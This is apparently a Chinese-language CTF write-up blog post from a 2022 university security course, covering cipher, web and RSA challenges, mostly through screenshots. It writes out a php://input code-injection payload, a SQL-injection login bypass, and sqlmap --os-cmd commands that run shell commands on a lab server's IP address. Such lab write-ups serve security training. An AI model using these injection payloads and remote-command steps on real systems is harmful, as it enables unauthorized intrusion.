---
title: 22年网安小学期-CTF
tags: 
  - 网安小学期
  - CTF
category: WriteUP
permalink: /archives/65465/
published: 2022-07-09 16:43:47
---

# 木册木兰

![img](./images/1656402244227-1535d8a9-9932-489c-af63-b357e1b72be7.png)

- 下载附件，然后根据提示可以看出就是栅栏密码，所以直接解密得到

![img](./images/1656402270709-22a55c9b-fd6e-4cef-b874-ef8a6146eb6b.png)

# inputer

![img](./images/1656402323639-3d802464-d117-4c8b-99b0-2b5c96c80556.png)



- 先源码，这里要用到php://伪协议
- 直接抓包然后改包，构造`php://input`，利用`system("ls");`输出当前目录下所包含的文件，发包后发现可利用

![img](./images/1656403524194-775abc02-cd99-402a-8efb-b0be856fd9e6.png)

- 那就直接用命令`<?php system("cat /flag.txt");?>`获得flag

![img](./images/1656403931462-65c99e45-585b-4da9-aa67-ebbf7b040faf.png)

# WEB_blind_exec

![img](./images/1656418501152-cffd8b07-e4b3-4c7d-88e9-2af93a200893.png)

# LFI

![img](./images/1656425908372-f0b23cde-7697-4219-a001-09d5cd26f703.png)

# baby_sql

```
admin' or '1'='1
```

![img](./images/1656463477302-afa6aabf-6cba-40da-a6ab-9c6d651c78ce.png)

# WEB_randnum

![img](./images/1656463743749-0e0e3ae5-1757-4c23-a7d3-04eef75b7ca4.png)

# WEB_babyphp

![img](./images/1656463757900-66e0ad0f-8176-46e7-aade-bff9d0305c50.png)

# easy_getshell

- [pbot复现](https://www.anquanke.com/post/id/212603?from=groupmessage#h2-6)

![img](./images/1656489800858-4a805906-bd00-402f-b3cb-b4cba8d14c15.png)

# sessionlfi

- 源码中发现页面传参使用get方法，猜测存在sql注入漏洞

![img](./images/1656507098348-a7fb1359-f1d6-48d8-9fae-9f5423965b72.png)

> 测试payload：
>
> sqlmap -u http://218.94.60.213:13198/table.php?id=1 -dbs
>
> 爆破数据库，共有4个数据库

![img](./images/1656507233920-96f5d286-73db-44df-adf0-8dabadee487b.png)

> 使用sqlmap的-os-cmd远程执行命令，看到根目录有flag字样文件
>
> sqlmap -u http://218.94.60.213:13198/table.php?id=1 --os-cmd="ls /"

![img](./images/1656507912473-95a1f3c3-29cc-4020-9ed2-c6b1d782801b.png)

> 最后继续使用远程命令查看得到flag
>
> sqlmap -u http://218.94.60.213:13198/table.php?id=1 --os-cmd="cat /flag_asflkhasklfhaklshfkjlashfjkas"

![img](./images/1656507964485-4c6551f9-be4e-48c3-bc18-37a4f769352b.png)

# happy

- 题目：

![img](./images/1656578511408-899d4caa-da5f-4f4d-b926-301072c6807c.png)

- 解题代码：

![img](./images/1660034476965-e38a5350-cba4-4601-b203-f106b0ffc8f4.png)

# rsarsa

- 题目：

![img](./images/1656578279183-f84801df-8c4f-4b41-9c7f-6d23eced6b56.png)

- 解题代码：

![img](./images/1660034540344-f99ee9de-c416-4530-8855-8f30f950ea9f.png)
